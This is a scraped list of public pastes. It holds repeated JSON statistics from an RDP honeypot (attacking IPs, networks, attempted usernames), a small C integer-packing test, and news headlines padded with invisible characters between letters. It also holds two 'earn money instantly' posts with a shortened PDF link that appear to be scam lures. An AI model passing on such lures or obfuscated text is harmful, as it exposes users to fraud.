id,title,username,language,date,content
8nJR3nHB,2025-03-24_stats.json,rdp_snitch,JSON,Tuesday 25th of March 2025 07:18:25 PM CDT,"{
  ""ip"": {
    ""220.117.78.210"": 69,
    ""106.14.144.233"": 435,
    ""165.22.186.232"": 12,
    ""139.177.201.148"": 3,
    ""103.37.60.27"": 33,
    ""185.42.12.5"": 18,
    ""147.185.132.9"": 9,
    ""165.227.22.50"": 12,
    ""157.245.226.238"": 3,
    ""66.228.42.15"": 3,
    ""45.227.254.152"": 12,
    ""199.45.155.76"": 3,
    ""178.63.252.130"": 3,
    ""147.185.132.213"": 9,
    ""172.232.225.185"": 6,
    ""178.20.129.235"": 3,
    ""14.225.198.240"": 3,
    ""162.142.125.195"": 3,
    ""58.218.199.219"": 15,
    ""205.210.31.232"": 9,
    ""165.154.182.72"": 3,
    ""185.242.226.23"": 3,
    ""216.24.216.245"": 66,
    ""157.245.104.150"": 3,
    ""198.235.24.68"": 9
  },
  ""asn"": {
    ""AS4766"": 69,
    ""AS37963"": 435,
    ""AS14061"": 30,
    ""AS63949"": 12,
    ""AS149147"": 33,
    ""AS59425"": 18,
    ""AS396982"": 36,
    ""AS267784"": 12,
    ""AS398722"": 3,
    ""AS24940"": 3,
    ""AS24810"": 3,
    ""AS135905"": 3,
    ""AS398324"": 3,
    ""AS4134"": 15,
    ""AS135377"": 3,
    ""AS202425"": 3,
    ""AS174"": 66
  },
  ""isp"": {
    ""Korea Telecom"": 69,
    ""Hangzhou Alibaba Advertising Co"": 435,
    ""DigitalOcean, LLC"": 30,
    ""Akamai Technologies, Inc."": 12,
    ""Gofiber Software Technology Company Limited"": 33,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 12,
    ""Censys, Inc."": 6,
    ""Hetzner Online GmbH"": 3,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Vietnam Posts and Telecommunications Group"": 3,
    ""Chinanet"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""IP Volume inc"": 3,
    ""Ipxo LLC"": 66
  },
  ""org"": {
    ""Kornet"": 69,
    ""Aliyun Computing Co., LTD"": 435,
    ""DigitalOcean, LLC"": 30,
    ""Linode"": 6,
    ""GOFIBER-SOFTWARE"": 33,
    ""Horizon LLC"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""Xwin Universal LTD"": 12,
    ""Censys, Inc."": 3,
    ""Rasoul Shamaei"": 3,
    ""Akamai Technologies, Inc."": 6,
    ""Teleset LLC"": 3,
    ""VNPT"": 3,
    ""Censys Inc"": 3,
    ""Chinanet JS"": 15,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""AI Spera"": 3,
    ""Unknown"": 66
  },
  ""regionName"": {
    ""Seoul"": 69,
    ""Shanghai"": 435,
    ""New Jersey"": 15,
    ""Georgia"": 3,
    ""Ho Chi Minh"": 33,
    ""Moscow"": 18,
    ""California"": 54,
    ""Vilnius"": 12,
    ""Kowloon"": 3,
    ""Saxony"": 3,
    ""Jakarta"": 6,
    ""Tatarstan Republic"": 3,
    ""Hanoi"": 3,
    ""Michigan"": 3,
    ""Jiangsu"": 15,
    ""North Holland"": 3,
    ""North Rhine-Westphalia"": 66,
    ""Karnataka"": 3
  },
  ""country"": {
    ""South Korea"": 69,
    ""China"": 450,
    ""United States"": 75,
    ""Vietnam"": 36,
    ""Russia"": 21,
    ""Lithuania"": 12,
    ""Hong Kong"": 3,
    ""Germany"": 69,
    ""Indonesia"": 6,
    ""The Netherlands"": 3,
    ""India"": 3
  },
  ""account"": {
    ""hello"": 636,
    ""u6g5liub"": 12,
    ""beio"": 9,
    ""Test"": 18,
    ""FCLbxsYoI"": 3,
    ""lNqSCx"": 3,
    ""pvGnBp"": 3,
    ""w5zsc54b"": 12,
    ""(empty)"": 6,
    ""RcjDaNVqe"": 3,
    ""hOaUmq"": 3,
    ""fPYesr"": 3,
    ""Domain"": 12,
    ""vlHJdCQLz"": 3,
    ""XpYWBq"": 3,
    ""cbcAlo"": 3,
    ""Administrator"": 3,
    ""nmap"": 3,
    ""BbArRsQkw"": 3,
    ""WpAirB"": 3,
    ""IfCFzw"": 3
  },
  ""keyboard"": {
    ""Unknown"": 747
  },
  ""client_build"": {
    ""Unknown"": 747
  },
  ""client_name"": {
    ""Unknown"": 747
  },
  ""ip_type"": {
    ""Unknown"": 129,
    ""hosting & proxy"": 462,
    ""hosting"": 57,
    ""proxy"": 33,
    ""mobile & proxy"": 66
  }
}"
Az1N1BgU,Make $1000 15-MINUTES (BEGINNER) F1,Noonie,JavaScript,Tuesday 25th of March 2025 07:17:55 PM CDT," 
Pdf https://tinyurl.com/methodssss


VZ4mVgyPja
"
Ar1S3YnM,2025-03-24_stats.json,rdp_snitch,JSON,Tuesday 25th of March 2025 07:16:13 PM CDT,"{
  ""ip"": {
    ""220.117.78.210"": 68,
    ""106.14.144.233"": 435,
    ""165.22.186.232"": 12,
    ""139.177.201.148"": 3,
    ""103.37.60.27"": 33,
    ""185.42.12.5"": 18,
    ""147.185.132.9"": 9,
    ""165.227.22.50"": 12,
    ""157.245.226.238"": 3,
    ""66.228.42.15"": 3,
    ""45.227.254.152"": 12,
    ""199.45.155.76"": 3,
    ""178.63.252.130"": 3,
    ""147.185.132.213"": 9,
    ""172.232.225.185"": 6,
    ""178.20.129.235"": 3,
    ""14.225.198.240"": 3,
    ""162.142.125.195"": 3,
    ""58.218.199.219"": 15,
    ""205.210.31.232"": 9,
    ""165.154.182.72"": 3,
    ""185.242.226.23"": 3,
    ""216.24.216.245"": 66,
    ""157.245.104.150"": 3,
    ""198.235.24.68"": 9
  },
  ""asn"": {
    ""AS4766"": 68,
    ""AS37963"": 435,
    ""AS14061"": 30,
    ""AS63949"": 12,
    ""AS149147"": 33,
    ""AS59425"": 18,
    ""AS396982"": 36,
    ""AS267784"": 12,
    ""AS398722"": 3,
    ""AS24940"": 3,
    ""AS24810"": 3,
    ""AS135905"": 3,
    ""AS398324"": 3,
    ""AS4134"": 15,
    ""AS135377"": 3,
    ""AS202425"": 3,
    ""AS174"": 66
  },
  ""isp"": {
    ""Korea Telecom"": 68,
    ""Hangzhou Alibaba Advertising Co"": 435,
    ""DigitalOcean, LLC"": 30,
    ""Akamai Technologies, Inc."": 12,
    ""Gofiber Software Technology Company Limited"": 33,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 12,
    ""Censys, Inc."": 6,
    ""Hetzner Online GmbH"": 3,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Vietnam Posts and Telecommunications Group"": 3,
    ""Chinanet"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""IP Volume inc"": 3,
    ""Ipxo LLC"": 66
  },
  ""org"": {
    ""Kornet"": 68,
    ""Aliyun Computing Co., LTD"": 435,
    ""DigitalOcean, LLC"": 30,
    ""Linode"": 6,
    ""GOFIBER-SOFTWARE"": 33,
    ""Horizon LLC"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""Xwin Universal LTD"": 12,
    ""Censys, Inc."": 3,
    ""Rasoul Shamaei"": 3,
    ""Akamai Technologies, Inc."": 6,
    ""Teleset LLC"": 3,
    ""VNPT"": 3,
    ""Censys Inc"": 3,
    ""Chinanet JS"": 15,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""AI Spera"": 3,
    ""Unknown"": 66
  },
  ""regionName"": {
    ""Seoul"": 68,
    ""Shanghai"": 435,
    ""New Jersey"": 15,
    ""Georgia"": 3,
    ""Ho Chi Minh"": 33,
    ""Moscow"": 18,
    ""California"": 54,
    ""Vilnius"": 12,
    ""Kowloon"": 3,
    ""Saxony"": 3,
    ""Jakarta"": 6,
    ""Tatarstan Republic"": 3,
    ""Hanoi"": 3,
    ""Michigan"": 3,
    ""Jiangsu"": 15,
    ""North Holland"": 3,
    ""North Rhine-Westphalia"": 66,
    ""Karnataka"": 3
  },
  ""country"": {
    ""South Korea"": 68,
    ""China"": 450,
    ""United States"": 75,
    ""Vietnam"": 36,
    ""Russia"": 21,
    ""Lithuania"": 12,
    ""Hong Kong"": 3,
    ""Germany"": 69,
    ""Indonesia"": 6,
    ""The Netherlands"": 3,
    ""India"": 3
  },
  ""account"": {
    ""hello"": 635,
    ""u6g5liub"": 12,
    ""beio"": 9,
    ""Test"": 18,
    ""FCLbxsYoI"": 3,
    ""lNqSCx"": 3,
    ""pvGnBp"": 3,
    ""w5zsc54b"": 12,
    ""(empty)"": 6,
    ""RcjDaNVqe"": 3,
    ""hOaUmq"": 3,
    ""fPYesr"": 3,
    ""Domain"": 12,
    ""vlHJdCQLz"": 3,
    ""XpYWBq"": 3,
    ""cbcAlo"": 3,
    ""Administrator"": 3,
    ""nmap"": 3,
    ""BbArRsQkw"": 3,
    ""WpAirB"": 3,
    ""IfCFzw"": 3
  },
  ""keyboard"": {
    ""Unknown"": 746
  },
  ""client_build"": {
    ""Unknown"": 746
  },
  ""client_name"": {
    ""Unknown"": 746
  },
  ""ip_type"": {
    ""Unknown"": 128,
    ""hosting & proxy"": 462,
    ""hosting"": 57,
    ""proxy"": 33,
    ""mobile & proxy"": 66
  }
}"
B9mChP2x,2025-03-24_stats.json,rdp_snitch,JSON,Tuesday 25th of March 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""220.117.78.210"": 67,
    ""106.14.144.233"": 435,
    ""165.22.186.232"": 12,
    ""139.177.201.148"": 3,
    ""103.37.60.27"": 33,
    ""185.42.12.5"": 18,
    ""147.185.132.9"": 9,
    ""165.227.22.50"": 12,
    ""157.245.226.238"": 3,
    ""66.228.42.15"": 3,
    ""45.227.254.152"": 12,
    ""199.45.155.76"": 3,
    ""178.63.252.130"": 3,
    ""147.185.132.213"": 9,
    ""172.232.225.185"": 6,
    ""178.20.129.235"": 3,
    ""14.225.198.240"": 3,
    ""162.142.125.195"": 3,
    ""58.218.199.219"": 15,
    ""205.210.31.232"": 9,
    ""165.154.182.72"": 3,
    ""185.242.226.23"": 3,
    ""216.24.216.245"": 66,
    ""157.245.104.150"": 3,
    ""198.235.24.68"": 9
  },
  ""asn"": {
    ""AS4766"": 67,
    ""AS37963"": 435,
    ""AS14061"": 30,
    ""AS63949"": 12,
    ""AS149147"": 33,
    ""AS59425"": 18,
    ""AS396982"": 36,
    ""AS267784"": 12,
    ""AS398722"": 3,
    ""AS24940"": 3,
    ""AS24810"": 3,
    ""AS135905"": 3,
    ""AS398324"": 3,
    ""AS4134"": 15,
    ""AS135377"": 3,
    ""AS202425"": 3,
    ""AS174"": 66
  },
  ""isp"": {
    ""Korea Telecom"": 67,
    ""Hangzhou Alibaba Advertising Co"": 435,
    ""DigitalOcean, LLC"": 30,
    ""Akamai Technologies, Inc."": 12,
    ""Gofiber Software Technology Company Limited"": 33,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 12,
    ""Censys, Inc."": 6,
    ""Hetzner Online GmbH"": 3,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Vietnam Posts and Telecommunications Group"": 3,
    ""Chinanet"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""IP Volume inc"": 3,
    ""Ipxo LLC"": 66
  },
  ""org"": {
    ""Kornet"": 67,
    ""Aliyun Computing Co., LTD"": 435,
    ""DigitalOcean, LLC"": 30,
    ""Linode"": 6,
    ""GOFIBER-SOFTWARE"": 33,
    ""Horizon LLC"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""Xwin Universal LTD"": 12,
    ""Censys, Inc."": 3,
    ""Rasoul Shamaei"": 3,
    ""Akamai Technologies, Inc."": 6,
    ""Teleset LLC"": 3,
    ""VNPT"": 3,
    ""Censys Inc"": 3,
    ""Chinanet JS"": 15,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""AI Spera"": 3,
    ""Unknown"": 66
  },
  ""regionName"": {
    ""Seoul"": 67,
    ""Shanghai"": 435,
    ""New Jersey"": 15,
    ""Georgia"": 3,
    ""Ho Chi Minh"": 33,
    ""Moscow"": 18,
    ""California"": 54,
    ""Vilnius"": 12,
    ""Kowloon"": 3,
    ""Saxony"": 3,
    ""Jakarta"": 6,
    ""Tatarstan Republic"": 3,
    ""Hanoi"": 3,
    ""Michigan"": 3,
    ""Jiangsu"": 15,
    ""North Holland"": 3,
    ""North Rhine-Westphalia"": 66,
    ""Karnataka"": 3
  },
  ""country"": {
    ""South Korea"": 67,
    ""China"": 450,
    ""United States"": 75,
    ""Vietnam"": 36,
    ""Russia"": 21,
    ""Lithuania"": 12,
    ""Hong Kong"": 3,
    ""Germany"": 69,
    ""Indonesia"": 6,
    ""The Netherlands"": 3,
    ""India"": 3
  },
  ""account"": {
    ""hello"": 634,
    ""u6g5liub"": 12,
    ""beio"": 9,
    ""Test"": 18,
    ""FCLbxsYoI"": 3,
    ""lNqSCx"": 3,
    ""pvGnBp"": 3,
    ""w5zsc54b"": 12,
    ""(empty)"": 6,
    ""RcjDaNVqe"": 3,
    ""hOaUmq"": 3,
    ""fPYesr"": 3,
    ""Domain"": 12,
    ""vlHJdCQLz"": 3,
    ""XpYWBq"": 3,
    ""cbcAlo"": 3,
    ""Administrator"": 3,
    ""nmap"": 3,
    ""BbArRsQkw"": 3,
    ""WpAirB"": 3,
    ""IfCFzw"": 3
  },
  ""keyboard"": {
    ""Unknown"": 745
  },
  ""client_build"": {
    ""Unknown"": 745
  },
  ""client_name"": {
    ""Unknown"": 745
  },
  ""ip_type"": {
    ""Unknown"": 127,
    ""hosting & proxy"": 462,
    ""hosting"": 57,
    ""proxy"": 33,
    ""mobile & proxy"": 66
  }
}"
Vwk9BemR,EARN $900 INSTANTLY 2025,mfadli1,JavaScript,Tuesday 25th of March 2025 07:04:51 PM CDT,"Pdf : https://tinyurl.com/methodssss

Enjy"
mC1dpBB7,20 bit encoder test,gm310509,C,Tuesday 25th of March 2025 07:04:46 PM CDT,"#include <stdlib.h>
#include <stdio.h>

int checkRange(const char * varName, int x, int low, int high) {
  if (x < low || x > high) {
    printf(""Out of range %s=%d, [%d-%d]\n"", varName, x, low, high);
    return 1;
  }
  return 0;
}


void testPack (int a, int b, int c, int aMax, int bMax, int cMax) {
  aMax += 1;        // Increment the maximums to allow for the entire range (e.g. a max of 9 is 10 values if 0 is included).
  bMax += 1;
  cMax += 1;
  long pack = ((a * bMax) + b) * cMax + c;
  
  printf(""Packed value: %d (0x%x)\n"", pack, pack);
    
  
  long wrk = pack;
  int cUnpack = wrk % cMax;
  wrk = wrk / cMax;
  int bUnpack = wrk % bMax;
  wrk = wrk / bMax;
  int aUnpack = wrk;
  
  printf(""Unpacked:\na=%d, b=%d, c=%d\n"", aUnpack, bUnpack, cUnpack);
  
}


int main (int argc, char * argv[]) {
  printf(""Encoder 20 bit.\n"");
  
  if (argc != 4) {
    printf(""Expected 3 numeric arguments\n"");
    printf(""%s a b c\n"", argv[0]);
    printf("" a: [0-40]\n"");
    printf("" b: [0-41]\n"");
    printf("" c: [0-443]\n"");
    exit(1);
  }
  
  int a = atoi(argv[1]);
  int b = atoi(argv[2]);
  int c = atoi(argv[3]);
  
  printf(""a=%d, b=%d, c= %d\n"", a, b, c);
  
  int err = checkRange(""a"", a, 0, 40);
  err |= checkRange(""b"", b, 0, 41);
  err |= checkRange(""c"", c, 0, 443);
  
  if (err) {
    exit(1);
  }
  
  testPack (a, b, c, 40, 41, 443);
  
  exit(0);
}"
GpVYqBFV,News March25 25,Newscaster_Ned,Email,Tuesday 25th of March 2025 06:40:19 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

T‎i‎m‎e‎ ‎f‎o‎r‎ ‎a‎n‎ ‎u‎p‎d‎a‎t‎e‎ ‎o‎n‎ ‎m‎y‎ ‎f‎a‎v‎o‎r‎i‎t‎e‎ ‎m‎o‎n‎k‎e‎y‎s‎.‎

C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎n‎s‎ ‎S‎l‎a‎m‎ ‎I‎n‎s‎u‎r‎a‎n‎c‎e‎ ‎C‎o‎m‎p‎a‎n‎i‎e‎s‎ ‎F‎o‎r‎ ‎L‎a‎c‎k‎ ‎o‎f‎ ‎S‎u‎p‎p‎o‎r‎t‎ ‎A‎f‎t‎e‎r‎ ‎W‎i‎l‎d‎f‎i‎r‎e‎s‎
J‎a‎s‎m‎i‎n‎e‎ ‎C‎r‎o‎c‎k‎e‎t‎t‎ ‎G‎o‎n‎e‎ ‎W‎i‎l‎d‎:‎ ‎N‎e‎w‎ ‎F‎a‎c‎e‎ ‎o‎f‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎E‎m‎e‎r‎g‎e‎s‎
J‎D‎ ‎V‎a‎n‎c‎e‎ ‎J‎o‎i‎n‎i‎n‎g‎ ‎U‎s‎h‎a‎ ‎i‎n‎ ‎G‎r‎e‎e‎n‎l‎a‎n‎d‎ ‎A‎m‎i‎d‎ ‎C‎r‎i‎t‎i‎c‎i‎s‎m‎s‎ ‎o‎f‎ ‎V‎i‎s‎i‎t‎
M‎e‎x‎i‎c‎a‎n‎ ‎M‎e‎n‎ ‎A‎c‎c‎u‎s‎e‎d‎ ‎o‎f‎ ‎S‎e‎x‎u‎a‎l‎l‎y‎ ‎A‎s‎s‎a‎u‎l‎t‎i‎n‎g‎ ‎1‎4‎-‎Y‎r‎-‎O‎l‎d‎ ‎B‎o‎y‎ ‎o‎n‎ ‎C‎r‎u‎i‎s‎e‎ ‎S‎h‎i‎p‎
D‎i‎s‎n‎e‎y‎'‎s‎ ‎'‎S‎n‎o‎w‎ ‎W‎h‎i‎t‎e‎'‎ ‎S‎t‎a‎r‎ ‎R‎a‎c‎h‎e‎l‎ ‎Z‎e‎g‎l‎e‎r‎ ‎M‎o‎c‎k‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎D‎e‎c‎l‎a‎r‎i‎n‎g‎ ‎'‎#‎1‎ ‎M‎o‎v‎i‎e‎'‎
H‎u‎c‎k‎a‎b‎e‎e‎ ‎S‎t‎a‎n‎d‎s‎ ‎U‎p‎ ‎t‎o‎ ‎H‎o‎l‎l‎e‎r‎i‎n‎g‎ ‎P‎r‎o‎t‎e‎s‎t‎e‎r‎s‎,‎ ‎S‎e‎n‎a‎t‎o‎r‎ ‎V‎a‎n‎ ‎H‎o‎l‎l‎e‎n‎
B‎i‎d‎e‎n‎-‎E‎r‎a‎ ‎S‎m‎a‎l‎l‎ ‎B‎u‎s‎i‎n‎e‎s‎s‎ ‎A‎d‎m‎i‎n‎ ‎E‎x‎p‎o‎s‎e‎d‎ ‎i‎n‎ ‎L‎a‎x‎ ‎P‎u‎r‎s‎u‎i‎t‎ ‎o‎f‎ ‎C‎O‎V‎I‎D‎ ‎F‎r‎a‎u‎d‎
B‎e‎h‎a‎r‎:‎ ‎T‎r‎u‎m‎p‎ ‎H‎a‎s‎ ‎t‎o‎ ‎G‎o‎,‎ ‎G‎O‎P‎ ‎L‎o‎o‎k‎ ‎i‎n‎ ‎t‎h‎e‎ ‎M‎i‎r‎r‎o‎r‎,‎ ‎I‎s‎ ‎t‎h‎i‎s‎ ‎C‎o‎u‎n‎t‎r‎y‎ ‎Y‎o‎u‎ ‎W‎a‎n‎t‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎:‎ ‎’‎F‎i‎g‎h‎t‎e‎r‎’‎ ‎S‎i‎n‎g‎e‎r‎/‎ ‎S‎o‎n‎g‎w‎r‎i‎t‎e‎r‎ ‎J‎o‎n‎ ‎K‎a‎h‎n‎ ‎R‎e‎l‎e‎a‎s‎e‎s‎ ‎F‎a‎i‎t‎h‎-‎D‎r‎i‎v‎e‎n‎ ‎’‎F‎i‎n‎g‎e‎r‎p‎r‎i‎n‎t‎s‎’‎

F‎i‎r‎s‎t‎ ‎S‎i‎n‎g‎l‎e‎ ‎S‎i‎n‎c‎e‎ ‎L‎o‎s‎i‎n‎g‎ ‎H‎o‎m‎e‎ ‎i‎n‎ ‎P‎a‎l‎i‎s‎a‎d‎e‎s‎ ‎F‎i‎r‎e‎

C‎h‎r‎o‎n‎i‎c‎l‎e‎s‎ ‎E‎p‎i‎c‎ ‎F‎a‎i‎t‎h‎ ‎J‎o‎u‎r‎n‎e‎y‎

’‎E‎v‎e‎n‎ ‎i‎n‎ ‎t‎h‎e‎ ‎d‎a‎r‎k‎n‎e‎s‎s‎ ‎I‎ ‎c‎a‎n‎ ‎s‎e‎e‎ ‎Y‎o‎u‎ ‎g‎o‎t‎ ‎y‎o‎u‎r‎ ‎f‎i‎n‎g‎e‎r‎p‎r‎i‎n‎t‎s‎ ‎o‎n‎ ‎m‎e‎’‎
W‎i‎t‎h‎ ‎h‎i‎s‎ ‎l‎a‎t‎e‎s‎t‎ ‎r‎e‎l‎e‎a‎s‎e‎ ‎“‎F‎i‎n‎g‎e‎r‎p‎r‎i‎n‎t‎s‎,‎”‎ ‎K‎a‎h‎n‎ ‎t‎a‎k‎e‎s‎ ‎l‎i‎s‎t‎e‎n‎e‎r‎s‎ ‎o‎n‎ ‎a‎n‎ ‎e‎m‎o‎t‎i‎o‎n‎a‎l‎ ‎m‎u‎s‎i‎c‎a‎l‎ ‎j‎o‎u‎r‎n‎e‎y‎ ‎t‎h‎a‎t‎ ‎t‎r‎a‎c‎e‎s‎ ‎t‎h‎e‎ ‎o‎r‎i‎g‎i‎n‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎f‎a‎i‎t‎h‎ ‎h‎e‎ ‎i‎n‎i‎t‎i‎a‎l‎l‎y‎ ‎f‎e‎l‎t‎ ‎b‎u‎t‎ ‎d‎e‎n‎i‎e‎d‎ ‎a‎s‎ ‎a‎ ‎y‎o‎u‎n‎g‎ ‎b‎o‎y‎,‎ ‎o‎n‎l‎y‎ ‎t‎o‎ ‎e‎m‎b‎r‎a‎c‎e‎ ‎a‎s‎ ‎a‎ ‎m‎a‎n‎.‎ ‎

B‎e‎h‎a‎r‎:‎ ‎T‎r‎u‎m‎p‎ ‎‘‎H‎a‎s‎ ‎t‎o‎ ‎G‎o‎,‎’‎ ‎G‎O‎P‎ ‎‘‎L‎o‎o‎k‎ ‎i‎n‎ ‎t‎h‎e‎ ‎M‎i‎r‎r‎o‎r‎,‎ ‎I‎s‎ ‎t‎h‎i‎s‎ ‎t‎h‎e‎ ‎C‎o‎u‎n‎t‎r‎y‎ ‎Y‎o‎u‎ ‎R‎e‎a‎l‎l‎y‎
B‎e‎h‎a‎r‎:‎ ‎T‎r‎u‎m‎p‎ ‎H‎a‎s‎ ‎t‎o‎ ‎G‎o‎,‎ ‎G‎O‎P‎ ‎L‎o‎o‎k‎ ‎i‎n‎ ‎t‎h‎e‎ ‎M‎i‎r‎r‎o‎r‎,‎ ‎I‎s‎ ‎t‎h‎i‎s‎ ‎C‎o‎u‎n‎t‎r‎y‎ ‎Y‎o‎u‎ ‎W‎a‎n‎t‎
1‎1‎1‎
D‎e‎f‎e‎n‎s‎e‎ ‎S‎e‎c‎r‎e‎t‎a‎r‎y‎ ‎P‎e‎t‎e‎ ‎H‎e‎g‎s‎e‎t‎h‎ ‎R‎e‎s‎p‎o‎n‎d‎s‎ ‎t‎o‎ ‎A‎t‎l‎a‎n‎t‎i‎c‎ ‎R‎e‎p‎o‎r‎t‎:‎ ‎‘‎N‎o‎b‎o‎d‎y‎ ‎W‎a‎s‎ ‎T‎e‎x‎t‎i‎n‎g‎ ‎W‎a‎r‎ ‎P‎l‎a‎n‎s‎&‎#‎8‎2‎
P‎e‎t‎e‎ ‎H‎e‎g‎s‎e‎t‎h‎ ‎R‎e‎s‎p‎o‎n‎d‎s‎ ‎t‎o‎ ‎A‎t‎l‎a‎n‎t‎i‎c‎ ‎R‎e‎p‎o‎r‎t‎:‎ ‎'‎N‎o‎b‎o‎d‎y‎ ‎W‎a‎s‎ ‎T‎e‎x‎t‎i‎n‎g‎ ‎W‎a‎r‎ ‎P‎l‎a‎n‎s‎'‎
9‎,‎0‎1‎2‎
T‎r‎u‎m‎p‎ ‎P‎a‎r‎d‎o‎n‎s‎ ‎H‎u‎n‎t‎e‎r‎ ‎B‎i‎d‎e‎n‎’‎s‎ ‎F‎o‎r‎m‎e‎r‎ ‎B‎u‎s‎i‎n‎e‎s‎s‎ ‎P‎a‎r‎t‎n‎e‎r‎ ‎D‎e‎v‎o‎n‎ ‎A‎r‎c‎h‎e‎r‎
T‎r‎u‎m‎p‎ ‎P‎a‎r‎d‎o‎n‎s‎ ‎H‎u‎n‎t‎e‎r‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎F‎o‎r‎m‎e‎r‎ ‎B‎u‎s‎i‎n‎e‎s‎s‎ ‎P‎a‎r‎t‎n‎e‎r‎ ‎D‎e‎v‎o‎n‎ ‎A‎r‎c‎h‎e‎r‎
1‎0‎3‎
D‎i‎s‎n‎e‎y‎’‎s‎ ‎‘‎S‎n‎o‎w‎ ‎W‎h‎i‎t‎e‎’‎ ‎S‎t‎a‎r‎ ‎R‎a‎c‎h‎e‎l‎ ‎Z‎e‎g‎l‎e‎r‎ ‎M‎o‎c‎k‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎D‎e‎c‎l‎a‎r‎i‎n‎g‎ ‎‘‎#‎1‎ ‎M‎o‎v‎i‎e‎ ‎I‎
D‎i‎s‎n‎e‎y‎'‎s‎ ‎'‎S‎n‎o‎w‎ ‎W‎h‎i‎t‎e‎'‎ ‎S‎t‎a‎r‎ ‎R‎a‎c‎h‎e‎l‎ ‎Z‎e‎g‎l‎e‎r‎ ‎M‎o‎c‎k‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎D‎e‎c‎l‎a‎r‎i‎n‎g‎ ‎'‎#‎1‎ ‎M‎o‎v‎i‎e‎'‎
7‎6‎
H‎e‎a‎r‎t‎ ‎R‎o‎c‎k‎e‎r‎ ‎N‎a‎n‎c‎y‎ ‎W‎i‎l‎s‎o‎n‎ ‎‘‎E‎m‎b‎a‎r‎r‎a‎s‎s‎e‎d‎’‎ ‎t‎o‎ ‎B‎e‎ ‎a‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎,‎ ‎F‎a‎n‎s‎ ‎S‎u‎g‎g‎e‎s‎t‎ ‎S‎h‎e‎ ‎L‎e‎a‎v‎e‎
H‎e‎a‎r‎t‎ ‎R‎o‎c‎k‎e‎r‎ ‎N‎a‎n‎c‎y‎ ‎W‎i‎l‎s‎o‎n‎ ‎'‎E‎m‎b‎a‎r‎r‎a‎s‎s‎e‎d‎'‎ ‎t‎o‎ ‎B‎e‎ ‎a‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎
1‎,‎4‎9‎8‎
T‎w‎o‎ ‎M‎e‎x‎i‎c‎a‎n‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎s‎,‎ ‎O‎n‎e‎ ‎w‎i‎t‎h‎ ‎H‎I‎V‎,‎ ‎A‎c‎c‎u‎s‎e‎d‎ ‎o‎f‎ ‎S‎e‎x‎u‎a‎l‎l‎y‎ ‎A‎s‎s‎a‎u‎l‎t‎i‎n‎g‎ ‎1‎4‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎B‎o‎y‎ ‎o‎n‎ ‎M‎i‎a‎m‎i‎-‎B‎o‎u‎n‎d‎ ‎
M‎e‎x‎i‎c‎a‎n‎ ‎M‎e‎n‎ ‎A‎c‎c‎u‎s‎e‎d‎ ‎o‎f‎ ‎S‎e‎x‎u‎a‎l‎l‎y‎ ‎A‎s‎s‎a‎u‎l‎t‎i‎n‎g‎ ‎1‎4‎-‎Y‎r‎-‎O‎l‎d‎ ‎B‎o‎y‎ ‎o‎n‎ ‎C‎r‎u‎i‎s‎e‎ ‎S‎h‎i‎p‎
5‎3‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎R‎e‎p‎.‎ ‎J‎a‎s‎m‎i‎n‎e‎ ‎C‎r‎o‎c‎k‎e‎t‎t‎ ‎o‎n‎ ‎H‎a‎n‎d‎l‎i‎n‎g‎ ‎P‎o‎l‎i‎t‎i‎c‎a‎l‎ ‎O‎p‎p‎o‎n‎e‎n‎t‎s‎:‎ ‎‘‎I‎ ‎T‎h‎i‎n‎k‎ ‎Y‎o‎u‎ ‎P‎u‎n‎c‎h‎’‎
